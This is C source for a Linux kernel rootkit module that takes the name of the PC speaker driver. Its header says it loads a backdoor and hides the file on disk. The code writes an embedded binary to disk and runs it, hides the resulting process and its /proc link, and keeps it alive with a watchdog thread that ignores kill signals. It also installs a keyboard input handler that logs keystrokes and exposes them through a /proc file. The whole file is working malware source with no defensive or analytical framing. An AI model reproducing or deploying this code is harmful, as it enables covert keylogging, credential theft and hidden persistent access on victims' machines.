/**
 * File: pcspkr.c
 * 
 * Notes: A kernel module to load the backdoor into memory and to hide the 
 *        file on disk.
 * 
 * Authors: Stephen Makonin
 *          Torin Sandall
 * 
 * Date: May/June 2008
 *
 * Copyright (C) 2008 Stephen Makonin and Torin Sandall. All rights reserved. 
 */


#include <linux/module.h>
#if defined(MODVERSIONS)
#include <linux/modversions.h>
#endif

#include <linux/list.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/errno.h>
#include <linux/sched.h>
#include <linux/stat.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/reboot.h>
#include <linux/syscalls.h>
#include <linux/smp_lock.h>
#include <linux/workqueue.h>
#include <linux/string.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <asm/system.h>
#include <linux/slab.h>
#include <linux/input.h>
#include <linux/init.h>
#include <linux/device.h>

#include "pcspkr.h"
#include "piggy.h"

#define THREAD_NAME   "overseer"

static struct semaphore sleep_sem;
static struct task_struct *daemon = NULL;
static struct task_struct *thread = NULL;
static int terminate = 0;
static int keylog_op = KEYLOG_STATE_STOP;
static int keylog_buf_pos = 0;
static char keylog_buf[KEYLOG_BUFLEN + 1] = {0};
static int shift_on = 0;

static void kbinput_event(struct input_handle *handle, unsigned int type, unsigned int code, int value)
{
    char ch = -1;
    
    if(type == EV_KEY)
    {
        if(value)
        {
            switch(code)
            {
                case 0x1E: ch = (!shift_on) ? 'a' : 'A'; break;
                case 0x30: ch = (!shift_on) ? 'b' : 'B'; break;		                
                case 0x2E: ch = (!shift_on) ? 'c' : 'C'; break;		                
                case 0x20: ch = (!shift_on) ? 'd' : 'D'; break;		                
                case 0x12: ch = (!shift_on) ? 'e' : 'E'; break;		                
                case 0x21: ch = (!shift_on) ? 'f' : 'F'; break;		                
                case 0x22: ch = (!shift_on) ? 'g' : 'G'; break;		                
                case 0x23: ch = (!shift_on) ? 'h' : 'H'; break;		                
                case 0x17: ch = (!shift_on) ? 'i' : 'I'; break;		                
                case 0x24: ch = (!shift_on) ? 'j' : 'J'; break;		                
                case 0x25: ch = (!shift_on) ? 'k' : 'K'; break;		                
                case 0x26: ch = (!shift_on) ? 'l' : 'L'; break;		                
                case 0x32: ch = (!shift_on) ? 'm' : 'M'; break;		                
                case 0x31: ch = (!shift_on) ? 'n' : 'N'; break;		                
                case 0x18: ch = (!shift_on) ? 'o' : 'O'; break;		                
                case 0x19: ch = (!shift_on) ? 'p' : 'P'; break;		                
                case 0x10: ch = (!shift_on) ? 'q' : 'Q'; break;		                
                case 0x13: ch = (!shift_on) ? 'r' : 'R'; break;		                
                case 0x1F: ch = (!shift_on) ? 's' : 'S'; break;		                
                case 0x14: ch = (!shift_on) ? 't' : 'T'; break;		                
                case 0x16: ch = (!shift_on) ? 'u' : 'U'; break;		                
                case 0x2F: ch = (!shift_on) ? 'v' : 'V'; break;		                
                case 0x11: ch = (!shift_on) ? 'w' : 'W'; break;		                
                case 0x2D: ch = (!shift_on) ? 'x' : 'X'; break;		                
                case 0x15: ch = (!shift_on) ? 'y' : 'Y'; break;		                
                case 0x2C: ch = (!shift_on) ? 'z' : 'Z'; break;		                
                case 0x02: ch = (!shift_on) ? '1' : '!'; break;		                
                case 0x03: ch = (!shift_on) ? '2' : '@'; break;		                
                case 0x04: ch = (!shift_on) ? '3' : '#'; break;		                
                case 0x05: ch = (!shift_on) ? '4' : '$'; break;		                
                case 0x06: ch = (!shift_on) ? '5' : '%'; break;		                
                case 0x07: ch = (!shift_on) ? '6' : '^'; break;		                
                case 0x08: ch = (!shift_on) ? '7' : '&'; break;		                
                case 0x09: ch = (!shift_on) ? '8' : '*'; break;		                
                case 0x0A: ch = (!shift_on) ? '9' : '('; break;		                
                case 0x0B: ch = (!shift_on) ? '0' : ')'; break;		                
                case 0x0C: ch = (!shift_on) ? '-' : '_'; break;		                
                case 0x0D: ch = (!shift_on) ? '=' : '+'; break;		                
                case 0x1A: ch = (!shift_on) ? '[' : '{'; break;		                
                case 0x1B: ch = (!shift_on) ? ']' : '}'; break;		                
                case 0x27: ch = (!shift_on) ? ';' : ':'; break;		                
                case 0x28: ch = (!shift_on) ? '\'' : '"'; break;		                
                case 0x29: ch = (!shift_on) ? '`' : '~'; break;		                
                case 0x2B: ch = (!shift_on) ? '\\' : '|'; break;		                
                case 0x33: ch = (!shift_on) ? ',' : '<'; break;		                
                case 0x34: ch = (!shift_on) ? '.' : '>'; break;		                
                case 0x35: ch = (!shift_on) ? '/' : '?'; break;		                
                case 0x1C: ch = '\n'; break;		                
                case 0x37: ch = '*'; break;		                
                case 0x4A: ch = '-'; break;		                
                case 0x4E: ch = '+'; break;		                
                case 0x39: ch = ' '; break;
                case 0x0E: ch = '\b'; break;
                case 0x2A:  
                case 0x36:  
                    shift_on = 1;
                    break;
                default: 
                    ch = -1; 
                    break;            
            }
        }
        else
        {
            switch(code)
            {
                case 0x2A:  
                case 0x36:  
                    shift_on = 0;
                    break;                
                default: 
                    ch = -1; 
                    break;            
            }
        }        
        
        if(ch > 0 && keylog_op == KEYLOG_STATE_START)
        {
            keylog_buf[keylog_buf_pos++ % KEYLOG_BUFLEN] = ch;
            keylog_buf[keylog_buf_pos % KEYLOG_BUFLEN] = 0;
        }
    }    
}

static int kbinput_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id)
{
	struct input_handle *handle;
	int error;

	handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
	if (!handle)
		return -ENOMEM;

	handle->dev = dev;
	handle->handler = handler;
	handle->name = "kbemu";

	error = input_register_handle(handle);
	if (error)
		goto err_free_handle;

	error = input_open_device(handle);
	if (error)
		goto err_unregister_handle;

	return 0;

 err_unregister_handle:
	input_unregister_handle(handle);
 err_free_handle:
	kfree(handle);
	return error;
}

static void kbinput_disconnect(struct input_handle *handle)
{

	input_close_device(handle);
	input_unregister_handle(handle);
	kfree(handle);
}

static const struct input_device_id kbinput_ids[] = 
{
	{ .driver_info = 1 },
	{ },			
};

MODULE_DEVICE_TABLE(input, kbinput_ids);

static struct input_handler kbinput_handler = 
{
	.event =	kbinput_event,
	.connect =	kbinput_connect,
	.disconnect =	kbinput_disconnect,
	.name =		"kbemu",
	.id_table =	kbinput_ids,
};

static int show_keylog(char *buffer, char **start, off_t offset, int length) 
{
	int size;
	
	if(offset > 0) 
	{
		size = 0;
	} 
	else 
	{
		size = strlen(keylog_buf);
		memcpy(buffer, keylog_buf, size);
	}

	return size;    
}

static int control_keylog(struct file *file, const char *buffer, unsigned long count, void *data) 
{
    unsigned long val = 0;
    char buf[10];
    char *endp;
    
    if (count > sizeof(buf))
        return -EINVAL;
    if (copy_from_user(buf, buffer, count))
        return -EFAULT;
    val = simple_strtoul(buf, &endp, 10);
    if (*endp != '\n')
        return -EINVAL;
    
    switch(val)
    {
        case KEYLOG_STATE_START:
            keylog_op = KEYLOG_STATE_START;
            break;

        case KEYLOG_STATE_STOP:
            keylog_op = KEYLOG_STATE_STOP;
            break;

        case KEYLOG_STATE_CLEAR:
            keylog_buf[0] = 0;
            keylog_buf_pos = 0;
            break;
    }

    return count;
}

static void xtoa(unsigned long val, char *buf)
{
  char *p;
  char *firstdig;
  char temp;
  unsigned digval;
  int radix = 10;

  p = buf;

  // Save pointer to first digit
  firstdig = p;

  do
  {
    digval = (unsigned) (val % radix);
    val /= radix;

    // Convert to ascii and store
    if (digval > 9)
      *p++ = (char) (digval - 10 + 'a');
    else
      *p++ = (char) (digval + '0');
  } while (val > 0);

  // We now have the digit of the number in the buffer, but in reverse
  // order.  Thus we reverse them now.

  *p-- = '\0';
  do
  {
    temp = *p;
    *p = *firstdig;
    *firstdig = temp;
    p--;
    firstdig++;
  } while (firstdig < p);
}

static struct task_struct *find_task_by_name(char *name)
{
    struct task_struct *task;

    for_each_process(task)
    {
        if(!strcmp(task->comm, name))
            return task;        
    }

    return 0;
}

void create_file(void)
{
	struct file *filp;
	mm_segment_t oldfs;
	int	written;
	
	filp = filp_open(FILE_LOCATION, O_CREAT | O_WRONLY, 0700);
	if(IS_ERR(filp) || (filp == NULL))
		return;

	if(filp->f_op->write == NULL)
		return;

	filp->f_pos = 0;
	oldfs = get_fs();
	set_fs(KERNEL_DS);
	written = filp->f_op->write(filp, bin_data, sizeof(bin_data), &filp->f_pos);
	set_fs(oldfs);

	fput(filp);
}

void destroy_file(void)
{
    struct file *filp; 
    
    filp = open_exec(FILE_LOCATION);
    generic_delete_inode(filp->f_dentry->d_inode);
    simple_unlink(filp->f_dentry->d_inode, filp->f_dentry);
}

void destroy_link(int pid, char *file)
{
    char buf[64];
    
    strcpy(buf, "/proc/");
    xtoa(pid, &buf[6]);
    strcpy(&buf[strlen(buf)], "/"); 
    strcpy(&buf[strlen(buf)], file); 
    remove_proc_entry(buf, 0);
}

void start_daemon(void)
{
    if(daemon)
        return;

    create_file();

    call_usermodehelper(FILE_LOCATION, NULL, NULL, 1);
    lock_kernel();	
    if((daemon = find_task_by_name(DAEMON_NAME)))
        daemon->tgid = 0;
    unlock_kernel(); 
        
    destroy_link(daemon->pid, "exe");
}

void check_daemon(void)
{
    if(!daemon)
        return;
        
    lock_kernel();	
    if(!find_task_by_pid(daemon->pid))
        daemon = NULL;    
    unlock_kernel();  
}

int watchdog(void *data)
{
    wait_queue_head_t queue;

    lock_kernel();
    thread = current;
    siginitsetinv(&current->blocked, sigmask(SIGKILL) | sigmask(SIGINT) | sigmask(SIGTERM));
    init_waitqueue_head(&queue);
    terminate = 0;
    sprintf(current->comm, THREAD_NAME);
    current->tgid = 0;
    daemon = find_task_by_name(DAEMON_NAME);
    unlock_kernel();
    up(&sleep_sem);

    for(;;)
    {
        // execute and hide evil daemon
        start_daemon();

        // take a break
        interruptible_sleep_on_timeout(&queue, HZ);
        mb();
        if(terminate)
            break;
                
        // check if still running    
        check_daemon();
    }

    lock_kernel();
    thread = NULL;
    mb();
	up(&sleep_sem);
	
	return 0;
}

void launch_watchdog(void *dname)
{
    kernel_thread(watchdog, dname, 0);        
}

DECLARE_WORK(sched_q, (void *)&launch_watchdog);

static int my_stop(void)
{
    //shutdown kthread
    lock_kernel();
    init_MUTEX_LOCKED(&sleep_sem);
    mb();
    terminate = 1;
    mb();
    kill_proc(thread->pid, SIGKILL, 1);
    flush_scheduled_work();
    down(&sleep_sem);
    kill_proc(2, SIGCHLD, 1);
    
    remove_proc_entry(KB_PROC_LOCATION, 0);
    
    input_unregister_handler(&kbinput_handler);
 	
    return 0;
}

static int my_notify_sys(struct notifier_block *this, unsigned long code, void *unused)
{
    if(code == SYS_DOWN || code == SYS_HALT)
        my_stop();
                
    return NOTIFY_DONE;
}

static struct notifier_block reboot_notifier = 
{
    .notifier_call = my_notify_sys,
};

int init_module(void)
{      
    struct proc_dir_entry *proc_kb;

    // listen for a reboot sig
    register_reboot_notifier(&reboot_notifier); 

    //setup sched to launch kthread
    init_MUTEX_LOCKED(&sleep_sem);
    schedule_work(&sched_q);
    down(&sleep_sem);
        
    // setup keylogging
    proc_kb = create_proc_info_entry(KB_PROC_LOCATION, 0, 0, show_keylog);
    if(proc_kb) 
        proc_kb->write_proc = control_keylog;
        
    input_register_handler(&kbinput_handler);

    return 0;
}

void cleanup_module(void)
{
	my_stop();
}


MODULE_LICENSE("GPL");

